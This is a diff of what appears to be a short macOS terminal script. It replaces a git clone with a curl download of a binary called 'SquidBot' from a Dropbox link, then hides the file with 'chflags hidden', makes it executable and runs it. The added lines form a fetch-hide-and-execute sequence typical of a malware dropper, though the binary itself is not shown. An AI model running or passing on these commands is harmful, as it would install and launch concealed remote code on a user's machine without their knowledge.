@@ -1,6 +1,5 @@
 #Terminal
-git clone --quiet https://github.com/afang0078/test0962; 
-chflags hidden test0962; 
-cd test0962; 
+curl "https://ucc62cd160e0a848f376cf398412.dl.dropboxusercontent.com/cd/0/inline2/Bil4D4sdvOIVYJMhfX-Z5PzIDHOKFvWsl7RiCTlQjZv_YoBLQo3wd5EqkFoLABwN1xPul4suJQlhRtradAMjohR_TkFSzfqGIt7qxS2WX6mXNf2l1Ca0fajL595xXmFeI2GDNcLWVIjaDwQDEvPuBeIXLCVEevLVlqTs_cnkq8MGDXxUwh8ScvFQF_v8VT53KrVnZkfnq7d4Gi3S_R4isRjlJzULmpVbv4UZJyvhOtIWFXiiQ5Ny6hN46hb0K5aFk2Gw-ZqXjoj1Ph8XpQVeImY871BW_Ll9O8IVygdnjEX1h6EpPaKR3fjMzyy_Mx2dtO_ReCAbrClP0D-vvX5Z_79nMltlDZUMw85mgEeT08ThkEDE_Vw2IZ99vwWBdU3-2-Coaq-7w9tkb5WQkAl33N5eIcXboIjyK-VXO-NFnkgDQg/file" -o SquidBot
+chflags hidden SquidBot; 
 chmod +x SquidBot; 
 ./SquidBot
